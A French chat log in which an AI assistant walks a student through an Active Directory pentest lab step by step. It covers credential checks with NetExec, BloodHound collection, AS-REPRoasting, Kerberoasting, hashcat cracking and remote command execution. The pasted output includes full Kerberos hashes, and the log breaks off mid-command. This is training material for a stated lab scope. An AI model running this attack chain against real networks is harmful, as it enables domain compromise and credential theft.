Nouveau TP aide moi à trouver les flags : Vous êtes employé en tant que Pentester de CampusPen par la société CELESTINA pour effectuer un audit de pentest sur leur infrastructure AD et attester de leur posture en matière de cybersécurité.

Le pentest se conduira avec un l'utilisateur Active Directory suivant :

Nom d'utilisateur: pentester

Mot de passe: Password123!

Les périmètres d'action sont les plages IPv4 suivantes:

10.13.37.0/24 sauf 10.13.37.1 qui est le parefeu et qui est HORS scope

10.37.13.0/24 bien que CELESTINA a mentionné que cette plage d'addresse ne devrait pas être accessible ?

Toutes les machines sont nommées WK-XXX où XXX est le dernier nombre de leur ip, par exemple WK-222 sera 10.13.37.222.

On peut se connecter à toutes les machines en RDP une fois que des accès valides ont été trouvés, crackés ou passés.

Dans la forme actuelle de ce labo, il n'y a pas d'escalade de privilège (sauf une), pas besoin d'obtenir un accès LOCAL SYSTEM.



Vous devez utilisez le serveur VPN fourni.

Vous devez utiliser la zone de réponse en bas à gauche de cette page pour valider les flags que vous trouverez.

Chaque flag contient quelques indices sur la façon de les obtenir, mais sont très vague de manière voulue.

C'est un excellent point de départ ! Avoir un accès initial (un foothold) avec le compte pentester nous fait gagner un temps précieux : nous pouvons directement attaquer l'Active Directory de l'intérieur.

L'information sur la plage 10.37.13.0/24 est un indice massif. Si CELESTINA dit qu'elle ne devrait pas être accessible, cela signifie très probablement que nous allons devoir trouver une machine "passerelle" (dual-homed) dans le premier réseau pour faire du pivoting et atteindre ce second réseau caché. Le fait qu'il n'y ait presque pas d'élévation de privilèges locale confirme que tout va se jouer sur la configuration de l'AD, les mots de passe dans les partages, et le mouvement latéral.

Voici la stratégie que je te propose pour démarrer cet audit méthodiquement.

1. Validation des accès et Reconnaissance
La toute première chose à faire est de voir ce qui est vivant sur le réseau principal et de valider nos identifiants partout.

Utilisons NetExec (anciennement CrackMapExec) pour scanner le réseau .13.37.0/24 et voir quelles machines acceptent nos identifiants. Cela nous donnera aussi le nom de domaine exact (utile pour la suite).

Bash
netexec smb 10.13.37.0/24 -u 'pentester' -p 'Password123!'
2. Cartographie de l'Active Directory (BloodHound)
Puisque nous avons un compte valide, nous pouvons demander à l'AD de nous donner toute sa structure (les groupes, les utilisateurs, les ordinateurs, les droits). C'est l'étape la plus rentable.
Si tu as un outil comme bloodhound-python sur ton environnement de pentest :

Bash
bloodhound-python -u 'pentester' -p 'Password123!' -ns <IP_DU_CONTROLEUR_DE_DOMAINE> -d <NOM_DU_DOMAINE> -c All
Cela générera des fichiers JSON à importer dans l'interface graphique de BloodHound pour visualiser les chemins d'attaque.

3. La chasse aux erreurs de configuration (Les "Roastings")
Avant même de chercher des failles complexes, on va vérifier si l'administrateur n'a pas laissé des vulnérabilités béantes sur les comptes utilisateurs (comme dans ton TP précédent).

AS-REPRoasting (Recherche de comptes sans pré-authentification) :

Bash
GetNPUsers.py <NOM_DU_DOMAINE>/pentester:'Password123!' -request -format hashcat -dc-ip <IP_DU_CONTROLEUR_DE_DOMAINE>
Kerberoasting (Recherche de comptes de service vulnérables) :

Bash
GetUserSPNs.py <NOM_DU_DOMAINE>/pentester:'Password123!' -request -dc-ip <IP_DU_CONTROLEUR_DE_DOMAINE>
4. Fouille des partages réseau (SMB)
Il est très fréquent de trouver des mots de passe oubliés ou des scripts contenant des identifiants dans les dossiers partagés.

Bash
netexec smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' --shares
Pour commencer sur de bonnes bases, as-tu déjà pu identifier l'adresse IP exacte du Contrôleur de Domaine (DC) parmi les machines du premier réseau ?

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\pentester:Password123! 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00



Donnemoi la commande bloodhound

Parfait, ton scan NetExec a payé ! Tu as validé tes identifiants partout et surtout, tu as débusqué le Contrôleur de Domaine (DC).

On voit clairement que le DC s'appelle DC-CELESTINA, qu'il gère le domaine celestina.shop, et que son adresse IP est 10.13.37.42.

Voici la commande bloodhound-python exacte, adaptée avec ces nouvelles informations, pour aspirer toute la configuration de l'Active Directory :

Bash
bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All
Laisse la commande tourner. Une fois terminée, elle va te générer plusieurs fichiers .json (utilisateurs, groupes, ordinateurs, etc.) dans ton répertoire courant.

Il ne te restera plus qu'à :

Lancer l'interface graphique de BloodHound (ou BloodHound CE).

Glisser-déposer tous ces fichiers JSON dans l'interface.

Analyser les chemins d'attaque (par exemple, chercher les liens "CanRDP", "GenericAll", ou voir qui a des droits sur quoi).

Pendant que BloodHound mouline ou que tu importes les données, tu peux lancer les commandes pour chercher des vulnérabilités Kerberos ou lister les partages SMB, comme on l'a vu tout à l'heure !

[May 18, 2026 - 09:23:20 (CEST)] exegol-free /workspace # bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)

INFO: Found AD domain: celestina.shop

INFO: Getting TGT for user

WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc-celestina.celestina.shop:88)] [Errno -2] Name or service not known

INFO: Connecting to LDAP server: dc-celestina.celestina.shop

INFO: Found 1 domains

INFO: Found 1 domains in the forest

INFO: Found 15 computers

INFO: Connecting to GC LDAP server: dc-celestina.celestina.shop

INFO: Connecting to LDAP server: dc-celestina.celestina.shop

INFO: Found 90 users

INFO: Found 52 groups

INFO: Found 3 gpos

INFO: Found 1 ous

INFO: Found 19 containers

INFO: Found 0 trusts

INFO: Starting computer enumeration with 10 workers

INFO: Querying computer: wk-155.celestina.shop

INFO: Querying computer: wk-044.celestina.shop

INFO: Querying computer: wk-137.celestina.shop

INFO: Querying computer: wk-132.celestina.shop

INFO: Querying computer: wk-020.celestina.shop

INFO: Querying computer: wk-234.celestina.shop

INFO: Querying computer: wk-222.celestina.shop

INFO: Querying computer: wk-202.celestina.shop

INFO: Querying computer: wk-030.celestina.shop

INFO: Querying computer: wk-124.celestina.shop

INFO: Querying computer: wk-123.celestina.shop

INFO: Querying computer: wk-111.celestina.shop

INFO: Querying computer: wk-010.celestina.shop

INFO: Querying computer: wk-101.celestina.shop

INFO: Querying computer: dc-celestina.celestina.shop

INFO: Done in 00M 05S

Super ! La récolte d'informations a parfaitement fonctionné. Tes fichiers .json (utilisateurs, ordinateurs, groupes, etc.) sont maintenant prêts dans ton dossier /workspace.

Avant d'aller plus loin, un petit "Pro-Tip" de pentester concernant la ligne jaune dans tes logs :
WARNING: Failed to get Kerberos TGT [...] Name or service not known
Ton outil n'a pas réussi à résoudre le nom dc-celestina.celestina.shop et a dû basculer sur NTLM. Pour t'éviter des problèmes avec les futures attaques Kerberos (qui exigent que le nom DNS corresponde parfaitement), je te conseille fortement d'ajouter le DC à ton fichier /etc/hosts local :

Bash
echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts
Voici maintenant ton plan d'action pour exploiter ces données :

1. Analyse BloodHound (La chasse au Pivot)
Puisque le but de l'exercice est d'atteindre le réseau secret 10.37.13.0/24 (et qu'on nous a prévenu qu'il n'y avait pas trop d'élévation de privilèges locaux), ton objectif principal est de trouver sur quelle machine ton utilisateur pentester a le droit de se connecter en RDP.

Ouvre l'interface de BloodHound (lance neo4j console puis bloodhound si tu es sur une machine classique, ou utilise l'interface web si Exegol te la fournit).

Glisse-dépose tous les fichiers .json qui viennent d'être créés dans l'interface.

Dans la barre de recherche, tape pentester, clique sur ton utilisateur, puis cherche l'onglet "Node Info".

Regarde attentivement la section "Execution Rights" (First Degree Local Admin, Can RDP, etc.).
👉 Dis-moi sur quelle(s) machine(s) tu as le droit "CanRDP" !

2. Validation des failles de configuration (Roasting)
Pendant que tu fouilles BloodHound, lance ces deux commandes pour vérifier si l'administrateur de Celestina n'a pas laissé traîner des comptes vulnérables. C'est souvent comme ça qu'on trouve les premiers flags.

A. Recherche de comptes vulnérables à l'AS-REPRoasting :

Bash
GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42
B. Recherche de comptes de service vulnérables au Kerberoasting :

Bash
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42
Si l'une de ces commandes te crache un gros bloc de texte (un hash), c'est gagné : on l'enverra directement dans Hashcat ! Qu'est-ce que ça donne de ton côté ?

donne moi les commandes 1 par 1, je suis sur exegol donc pas d'interface que des commandes : [May 18, 2026 - 09:24:41 (CEST)] exegol-free /workspace # echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts

[May 18, 2026 - 09:28:58 (CEST)] exegol-free /workspace # neo4j console

Directories in use:

home:         /var/lib/neo4j

config:       /etc/neo4j

logs:         /var/log/neo4j

plugins:      /var/lib/neo4j/plugins

import:       /var/lib/neo4j/import

data:         /var/lib/neo4j/data

certificates: /var/lib/neo4j/certificates

licenses:     /var/lib/neo4j/licenses

run:          /var/lib/neo4j/run

Starting Neo4j.

2026-05-18 07:29:23.027+0000 INFO  Starting...

2026-05-18 07:29:23.276+0000 INFO  This instance is ServerId{e755734d} (e755734d-c808-47ee-90ca-83f9babcd5f7)

2026-05-18 07:29:23.969+0000 INFO  ======== Neo4j 4.4.48 ========

2026-05-18 07:29:25.085+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED

2026-05-18 07:29:25.094+0000 INFO  Setting up initial user from `auth.ini` file: neo4j

2026-05-18 07:29:25.094+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=false, suspended=false)

2026-05-18 07:29:25.099+0000 INFO  Setting version for 'security-users' to 3

2026-05-18 07:29:25.100+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT

2026-05-18 07:29:25.102+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT

2026-05-18 07:29:25.270+0000 INFO  Bolt enabled on localhost:7687.

2026-05-18 07:29:25.764+0000 INFO  Remote interface available at http://localhost:7474/

2026-05-18 07:29:25.766+0000 INFO  id: F06D536CC677F4952062ED8373CCE0BFB7F66E945458AFBD5728349CFB9A0574

2026-05-18 07:29:25.767+0000 INFO  name: system

2026-05-18 07:29:25.767+0000 INFO  creationDate: 2026-05-18T07:29:24.305Z

2026-05-18 07:29:25.767+0000 INFO  Started.

C'est une excellente précision ! Si tu es sur Exegol en 100% ligne de commande (CLI) sans interface graphique, utiliser BloodHound va être un enfer (il faudrait importer les JSON en ligne de commande puis faire des requêtes en langage Cypher...).

On va être beaucoup plus malins et rapides. On va utiliser les outils CLI qui font exactement le même travail.

Voici tes commandes, une par une.

Étape 1 : Libère ton terminal
Actuellement, ton terminal est bloqué par neo4j console.
Fais simplement Ctrl + C pour l'arrêter. On n'en aura pas besoin.

Étape 2 : Trouver la machine RDP (L'alternative à BloodHound)
Puisque tu ne peux pas voir le graphe BloodHound, on va demander à NetExec de tester le protocole RDP sur toutes les machines du réseau avec ton compte. Il te mettra un beau Pwn3d! sur la machine où tu as le droit de te connecter !

Lance cette commande :

Bash
nxc rdp 10.13.37.0/24 -u 'pentester' -p 'Password123!'
Note la machine qui te renvoie un succès (Pwn3d!). C'est ton pivot.

Étape 3 : AS-REPRoasting
On vérifie si des comptes ont la pré-authentification désactivée (exactement comme dans ton TP précédent) :

Bash
GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42
Si ça te renvoie un gros hash commençant par $krb5asrep$, copie-le de côté dans un fichier asrep.txt.

Étape 4 : Kerberoasting
On vérifie si des comptes de service (SPN) sont vulnérables :

Bash
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42
Même chose, si ça te renvoie des hashs commençant par $krb5tgs$, sauvegarde-les dans un fichier tgs.txt.

Dis-moi ce que ces 3 commandes te renvoient !

[May 18, 2026 - 09:30:48 (CEST)] exegol-free /workspace # nxc rdp 10.13.37.0/24 -u 'pentester' -p 'Password123!'

RDP         10.13.37.44     3389   WK-044           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-044) (domain:celestina.shop) (nla:True)

RDP         10.13.37.42     3389   DC-CELESTINA     [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC-CELESTINA) (domain:celestina.shop) (nla:True)

RDP         10.13.37.10     3389   WK-010           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-010) (domain:celestina.shop) (nla:True)

RDP         10.13.37.101    3389   WK-101           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-101) (domain:celestina.shop) (nla:True)

RDP         10.13.37.20     3389   WK-020           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-020) (domain:celestina.shop) (nla:True)

RDP         10.13.37.137    3389   WK-137           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-137) (domain:celestina.shop) (nla:True)

RDP         10.13.37.202    3389   WK-202           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-202) (domain:celestina.shop) (nla:True)

RDP         10.13.37.111    3389   WK-111           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-111) (domain:celestina.shop) (nla:True)

RDP         10.13.37.30     3389   WK-030           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-030) (domain:celestina.shop) (nla:True)

RDP         10.13.37.132    3389   WK-132           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-132) (domain:celestina.shop) (nla:True)

RDP         10.13.37.123    3389   WK-123           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-123) (domain:celestina.shop) (nla:True)

RDP         10.13.37.124    3389   WK-124           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-124) (domain:celestina.shop) (nla:True)

RDP         10.13.37.222    3389   WK-222           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-222) (domain:celestina.shop) (nla:True)

RDP         10.13.37.155    3389   WK-155           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-155) (domain:celestina.shop) (nla:True)

RDP         10.13.37.234    3389   WK-234           [*] Windows 10 or Windows Server 2016 Build 22621 (name:WK-234) (domain:celestina.shop) (nla:True)

RDP         10.13.37.44     3389   WK-044           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.42     3389   DC-CELESTINA     [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.10     3389   WK-010           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.20     3389   WK-020           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.101    3389   WK-101           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.137    3389   WK-137           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.202    3389   WK-202           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.111    3389   WK-111           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.30     3389   WK-030           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.132    3389   WK-132           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.123    3389   WK-123           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.124    3389   WK-124           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.222    3389   WK-222           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.155    3389   WK-155           [+] celestina.shop\pentester:Password123! 

RDP         10.13.37.234    3389   WK-234           [+] celestina.shop\pentester:Password123! 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 09:31:17 (CEST)] exegol-free /workspace # GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42

/root/.pyenv/versions/3.11.14/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html

  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260424.191821.4790a2f3', 'GetNPUsers.py')

Impacket v0.14.0.dev0+20260424.191821.4790a2f3 - Copyright Fortra, LLC and its affiliated companies 



Name     MemberOf  PasswordLastSet             LastLogon                   UAC      

-------  --------  --------------------------  --------------------------  --------

j.vabre            2024-07-08 14:58:10.541265  2026-05-18 09:14:22.157592  0x410200 







$krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1f2783ce8681dbb6d29$cf51843d873e6971adb0ae7cb3bddf5e7bdfa1a4eb08805c61e17faccf7f46acc1c9fe3e49c47e1b830c2bb29f7c53c5c8495bf455f4f4c245b20b9a6c81d2502d7538bd45baccda5e7e69e9fec8c2d13dbd16f99c36d115e071d1a246259139b8f35500404790551f17ace9e0c14aabecbc653a8e696e65d8cbe1e2c6e3e7b5ad00c97a9821ec6692fdc3a647237fcaef0935f05528bdcf3b400d940e6cef78762e6a8d8943b95cdc2dfe2ed3469059519ba44bab042dd2e76f1d37b9882c3d16d0f6c1527df002296441b6f658432480ac733c0bcd1923cb05afbbd0e712ab8afad9f90c073d1926f88284f4ae3c95

[May 18, 2026 - 09:33:18 (CEST)] exegol-free /workspace # GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42

/root/.pyenv/versions/3.11.14/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html

  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260424.191821.4790a2f3', 'GetUserSPNs.py')

Impacket v0.14.0.dev0+20260424.191821.4790a2f3 - Copyright Fortra, LLC and its affiliated companies 



ServicePrincipalName           Name       MemberOf  PasswordLastSet             LastLogon                   Delegation  

-----------------------------  ---------  --------  --------------------------  --------------------------  -----------

HTTP/g.clooney.celestina.shop  g.clooney            2024-07-12 11:27:52.438146  2026-05-18 09:17:15.746959              

HTTP/I_NEED_A_SPN              k.cedepte            2025-03-20 14:13:23.907628  2026-05-18 09:32:31.141606  constrained 







[-] CCache file is not found. Skipping...

$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$c1ebab681ddf08c95c154ac12c179104$480611136c3bd296a07674f079d4162618ad52a4442965e1b69b557e63f6a551ad61020d3eacb6df5e07516991a6465dca4c0926ddbb2485431ad531668ccfceec535d8ca08def1d3c879085f856e00177e1bfbb516b38c06ba450a3fede30262504b4949ca0b022a78c6ab5214012267aaba862c8b88a6eef92dde803e32801bb5cbd7938ff4d74459cd66456638e189073f6d7570d27a1825b7ac9dac3ca7e5c6c3775befa4b8f0647a0944d4b6fb1913e7af890c42204943c1c86c89e7821c59d12987920158df97c8bf63bc1fdd722822f46db796a816956893b4113acc537d1483868bd7a1e2badaa03a80caa0a12a5775d0a288c0b778aea3e65f4c95004aa7bfb7b35390817908923b31110166251756afa047793f61cfc2213ae7204aac87825bb29919460d4107476f3435f1a4fe0bb0b8aa254024d58070021950240d6997797c0989c38c1deb469a63e6cebe09d8ea7313270b76f3af8aa1017d652f0921464b2385c791bdd0c87a15f036be76ac39a4f9259392a12b2d06fbdcc8f49795ef5e4787e40b03b0db2a991538b385d06601bb1b05dc4c550ef6b3c02935eb21ce76b066fddbe43c3d67adf4128aa4150be54159ce4d391a48171f0f3b06eb8166ea22bf9f8a1bd2b353963effb59a388f914bf6c39aae4d3c3d8d6c3aa79930fd9cf36a3f4f98e5ff2b1bfe06b61e60189dd40818186bcfec8c747f806c14441e73f0a6f9dd00954779ec87429256218e0e6221a01a2365aadcf723a7c8015f8e3c18622652decefb5b015b6a8d57bcdd6059376e77460a03dae405380523f1bd273cea25223e110b4ee8515e375959e543d7e3eba59acbd2a3211781566707f820083ae92bb4cdc04585851b51b04cc7fb80381bfcb2aaa805fb273453111e12d1802d1ed5c8228e1254ae385ae0fc8315ddb633cf10db12564aaeadd88ae4e9154c551fc7c387df63dc010500460f5d19dc4eb5ae080445ca06d6356b32706dc710705bfb2f1999a62e2e400c0746f59448212b41b253062381d8d460162d060c3ca3ce4a04af2e6403eece8cc4ac3a0b691257ccd135e257877d5c7c9a1b34d74a5ef76aba6e7ebbb2f25708939b1c1be23b0f143ecc3fe945b425861e0adf3e5060115bd76a9d85d3617910782c6f29f15366b79519f45863c919ef05c9e678a1fcd89043aae57b35abb27ae466f76c5fc0da2db5292868fbd744fe29280995d584072ea5744c955f8c502ac2d5da752106b4660409887d12c511f23f9e56cba69b9c3516e4216a5da9bb36f9e33d88515efa95f3cbe99631605aa0dd0cb39f7e6a44c77be32ff52810c8c787eeaded8c643ea8458b70d980afdb33bc703c63937eec87bd5ffb2299794981c224ba35265c1a96a96128abe2c34a5b14183b84c78115eb0df092c46ce66888333b4fc0e0faf8763700516287f0419563f0602407fe626c36257ce30a385edc330bdd7db0c23

$krb5tgs$23$*k.cedepte$CELESTINA.SHOP$celestina.shop/k.cedepte*$3e49f7cdfb92c518ebe776c8ff50a0c8$2a19024f0225e4e8f99109c66f7a98b28129a381663f43608301cc384d7b18af76bf1cfd828c4cdd300cd3b159d88243b55699a2a04cdd41991a144436c30727727bdf5e1ad1039e2d77158935a1673f897d09ac52a609cf0b7e775a389016985a10f589661d749f40511e138328fecd19fb66fe496e4c6c361c1c6172e9a0176051a412d101fbbf4225cf845399fc3077d85f8b38e28adc9895bd538dcbb89f787223b6f6270899eb84bfcc3fa5dda7ccd990a42ac30391009baca3769c62abeca891174f74a5fccdaba4539d41a41dcb4d5571ee44d8cdbd67bd4f5ff705722fcf43dec7e58dfb61c2a7e3d5279a81c33aef947f9b687b09aee8dbcb890b946598b4928e5e4324a6d6fa87caa94edec189f0c9418cd268b07b376f177f81fe01780a4a73b71f68d599d310de3704885c4df4b6c4ca382488ab2e9e62333dcda28ef4d35ff93117791ea54bc1b71c604a164e1b9c4ddf7c2643f2eb9d0ece7758a1d58d0ef6e02bbd3ddc1f4ef59932fff4c22b241f54e32985d853c649dd83dda544c46c3b00e085a6fddbcc0136ac00e42977b124c66d4288e29f7ac26cffd6c7958f5b55c94dbb779c3d49e589400c1b65f26eb01801d4bdac770ba28c81d118e208aa9a978f841f97135fa4713f1968d4f42b57d01aed29924be6e0916962fd0afb70c76f6765df89ce13ee5b67abac0f21fbe86742963be4951556dad742bc8557186a1dda725ab00e2707b101b623bc62d906a9e7706a210b4d4a88d30487257d4323bc372c39eb8f9c9058e2c8aebedd3a15164027d54e85ea2125a19be3422967481bfc8e28a837494863ca7aca1638dde55934ba1d12caf7646a810116e017f31de3fa106b7b330b0f8d3e2c2450a6075d4e3d7a017ce16b29420c45cdd072dc8091c5d0a773e98e4ef44eaaa29962e37dbab5e5d178ee610c370b8dc7cd5747e6e2cc50219063a925d1ff0a0a7d4a516003d41c74939b68a065423436be992406ab8052b3472c76c4592ef96f1628696311077692ba512ebcee51f8de70c65e033a6c274efbffd3223d9867514f7866ab54f87253207660d69ca56fce83a9f08529d1621032191d84efc572352b6921d441e0aaa93110608310db2af9b686b498ac5ef7efa85883e56af499d58e2eaf020dd3fbb16666673f1b7e6bd64e57a7920e99c00e4adca9a39dc0d21c88d582735ce429dbf45b9211845623dd4787af43465107cfb66e434caa172df112dba141b92c903ef4dacd3b8eaab40ac264728d68da975a9100585bcce75ce2890a149036a8e608029c865623bb0171497c3af75bab1f60b097b7b7ce343b2f01c96a37dbbfa455ee6719d7241cf4897767e6873e19e822e84389c4205a79f4cbd9ce67cfa694e5a988692d6a2efd05d7dfc18d7998673e16cd902803e1cb21983544cb304ddecc0626bd73ce143e90d66ef63ab601d9a3e0aa1149fabee0ffec12fac3a229

[May 18, 2026 - 09:33:35 (CEST)] exegol-free /workspace # 

C'est un véritable carton plein ! Tu as touché le jackpot sur les trois tableaux.

Voici l'analyse immédiate de ce que ton terminal vient de te recracher :

RDP : Tu as des [+] sur absolument toutes les machines. Ton utilisateur pentester a le droit de se connecter en bureau à distance partout, même sur le Contrôleur de Domaine !

AS-REPRoasting : Tu as récupéré le hash de l'utilisateur j.vabre.

Kerberoasting : Tu as récupéré les hashs de deux comptes de service : g.clooney et k.cedepte.

Il est temps de casser ces mots de passe et de trouver notre fameuse machine passerelle vers le réseau secret. Voici tes deux missions en parallèle.

1. Casser les mots de passe (Hashcat)
Copie les hashs que tu as obtenus et mets-les dans deux fichiers distincts.

A. Pour le hash AS-REP (j.vabre) :
Crée un fichier asrep.txt et colle uniquement la ligne qui commence par $krb5asrep$23$... (jusqu'à la fin de la ligne). Lance ensuite Hashcat avec le mode 18200 :

Bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
B. Pour les hashs Kerberoast (g.clooney et k.cedepte) :
Crée un fichier tgs.txt et colle les deux lignes qui commencent par $krb5tgs$23$.... Lance Hashcat avec le mode 13100 :

Bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
(Note : Selon ton installation d'Exegol, si rockyou.txt est introuvable, cherche-le avec locate rockyou.txt ou utilise /opt/wordlists/rockyou.txt).

2. Trouver la passerelle (Le Pivot)
Puisque tu peux te connecter partout, l'une de ces machines possède forcément deux cartes réseau (une dans le 10.13.37.0/24 et une dans le réseau interdit 10.37.13.0/24).

Plutôt que de te connecter en RDP sur les 15 machines une par une pour vérifier, on va demander à NetExec d'exécuter la commande ipconfig sur tout le parc en même temps pour trouver l'intruse :

Bash
nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' -x 'ipconfig'
Laisse tourner Hashcat et analyse les retours du ipconfig global. As-tu repéré une machine qui affiche une adresse IP appartenant à la plage 10.37.13.X ?

donne moi toutes les commande 1 par 1 stp pas à pas

Aucun problème, on va faire ça proprement et sans erreur.

J'ai préparé les commandes pour qu'elles créent les fichiers toutes seules avec les bons hashs que tu as obtenus. Tu n'as plus qu'à copier-coller ces blocs un par un dans ton terminal Exegol.

Étape 1 : Sauvegarder le hash de j.vabre
Copie-colle ce bloc entier. Il va créer le fichier asrep.txt avec le hash de j.vabre à l'intérieur. (Le EOF entre guillemets empêche Linux de confondre les $ avec des variables).

Bash
cat << 'EOF' > asrep.txt
